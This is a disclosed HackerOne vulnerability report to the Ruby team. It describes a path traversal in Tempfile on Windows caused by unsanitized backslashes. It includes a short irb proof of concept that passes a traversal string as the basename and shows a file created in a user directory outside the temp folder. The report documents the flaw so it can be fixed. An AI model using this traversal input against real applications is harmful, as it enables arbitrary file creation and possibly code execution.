# Path traversal in Tempfile on windows OS due to unsanitized backslashes

## Report Details
- **Report ID**: 1131465
- **URL**: https://hackerone.com/reports/1131465
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-03-20T19:21:50.112Z
- **Disclosed**: 2021-04-07T12:46:20.750Z

## Reporter
- **Username**: bugdiscloseguys
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Hi team,

##Summary

We've noticed that both arguments (basename and ext) of Tempfile on Windows are vulnerable to a path traversal which could allow unintentional file creating in arbitrary writable directories. 

Tempfile often has a user control either by basename or ext (or both). 

## PoC

~~~
irb(main):029:0> Tempfile.open(["\\..\\..\\..\\..\\..\\Users\\rootx\\malicious",".rb"])
=> #<Tempfile:C:/Users/rootx/AppData/Local/Temp\..\..\..\..\..\Users\rootx\malicious20210321-22472-fvuodx.rb>
irb(main):030:0> puts `dir C:\\Users\\rootx\\`
 Volume in drive C has no label.
 Volume Serial Number is C0F2-8D87

 Directory of C:\Users\rootx

... REDACTED ...
21-03-2021  00:45                 0 malicious20210321-22472-fvuodx.rb
... REDACTED ...
~~~

The same can be accomplished via ext argument. 

Thanks,
Harsh and Rahul,
HTTPVoid

## Impact

Unintentional file creation in an arbitrary directory. Could potentially cause RCE in RoR applications.

## Attachments
No attachments
